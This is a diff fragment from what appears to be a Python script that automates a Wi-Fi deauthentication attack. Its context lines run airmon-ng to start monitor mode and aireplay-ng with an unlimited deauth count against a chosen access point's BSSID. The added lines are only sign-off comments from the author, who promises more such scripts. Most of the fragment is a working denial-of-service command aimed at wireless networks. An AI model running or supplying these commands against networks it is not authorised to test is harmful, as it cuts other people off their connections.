@@ -206,5 +206,9 @@ subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
 
 # User will need to use control-c to break the script.
+# Thanks for checking this out, I hope it helps your automation with wifi deauthentication.
+# Watch out for more as I will be dropping more scripts.
+
+
 
 
